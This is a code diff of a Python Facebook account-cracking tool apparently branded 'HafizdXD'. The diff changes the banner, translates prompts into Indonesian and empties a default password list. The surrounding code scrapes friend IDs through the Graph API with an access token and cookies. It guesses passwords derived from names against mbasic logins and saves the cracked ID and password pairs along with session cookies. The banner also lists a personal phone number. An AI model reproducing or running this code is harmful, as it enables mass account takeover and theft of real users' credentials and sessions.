@@ -150,19 +150,19 @@ def back():
 def banner():
 	clear()
 	print("""%s
-╔═╗╔═╗╔═══╗╔═══╗╔═══╗╔═══╗╔════╗
-╚╗╚╝╔╝║╔═╗║║╔═╗║║╔═╗║║╔══╝║╔╗╔╗║
-─╚╗╔╝─║║─╚╝║║─║║║╚═╝║║╚══╗╚╝║║╚╝
-─╔╝╚╗─║║─╔╗║╚═╝║║╔╗╔╝║╔══╝──║║──
-╔╝╔╗╚╗║╚═╝║║╔═╗║║║║╚╗║╚══╗──║║──
-╚═╝╚═╝╚═══╝╚╝─╚╝╚╝╚═╝╚═══╝──╚╝──
+██╗░░██╗░█████╗░███████╗██╗███████╗██████╗░ 
+██║░░██║██╔══██╗██╔════╝██║╚════██║██╔══██╗
+███████║███████║█████╗░░██║░░███╔═╝██║░░██║                
+██╔══██║██╔══██║██╔══╝░░██║██╔══╝░░██║░░██║                
+██║░░██║██║░░██║██║░░░░░██║███████╗██████╔╝                
+╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═════╝░   
 
 ╔══════════════════════════════════════════╗
 ║ Creator   : HafizdXD                     ║
 ║ Github    : https://github.com/HafizdXD  ║
 ║ Whatsapp  : +6285758862225               ║
 ║ Version   : V7                           ║
-║ Status SC :\033[32mPremium               ║
+║ Status SC :Premium                       ║
 ╚══════════════════════════════════════════╝
 
 """%(P))
@@ -273,12 +273,12 @@ def multidump():
 		exit()
 	try:
 		linex()
-		nanya_keun = int(input('%s[%s●%s] ENTER LIMIT %s:%s '%(P,P,P,P,P)))
+		nanya_keun = int(input('%s[%s●%s] Mau Berapa Id? %s:%s '%(P,P,P,P,P)))
 	except:nanya_keun=100000000
 	for mnh in range(nanya_keun):
 		mnh +=1
 		print()
-		pil = input('[%s●%s] ENTER PUBLIC ID %s%s%s : '%(P,P,P,mnh,P))
+		pil = input('[%s●%s] MASUKKAN ID %s%s%s : '%(P,P,P,mnh,P))
 		try:
 			koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
 			for pi in koh2['friends']['data']:
@@ -297,7 +297,7 @@ def multidump():
 def setting():
 	wl = '# ID SEQUENCE SETTINGS'
 	sol().print(mark(wl, style='green'))
-	teks = '[01] CRACK FROM THE OLDEST ACCOUNT\n[02] CRACK FROM THE YOUNGEST ACCOUNT\n[03] CRACK RANDOM ID'
+	teks = '[01] CRACK FROM THE OLDEST ACCOUNT(\x1b[1;91mNot Recomended)\n[02] CRACK FROM THE YOUNGEST ACCOUNT(\033[32mRecomended)\n[03] CRACK RANDOM ID(\033[32mSangad Recomended)'
 	tak = nel(teks, style='cyan')
 	cetak(nel(tak, title=' • SETTING • '))
 	hu = input(x+'['+p+'f'+x+'] Choose : ')
@@ -360,7 +360,7 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['1122334455','1234554321','112233445566', '123456654321','1234567890','20002000','1234512345','12345678901234567890']
+			pwv = []
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
@@ -469,7 +469,7 @@ def crackmbasic(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{H}OK🤣 {idf} | {pw}|{kuki}{N}')
+				print(f'\r{H}[HAFIZD-XD] OK {idf} ID {pw}SANDI{kuki}{N}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				break
 				
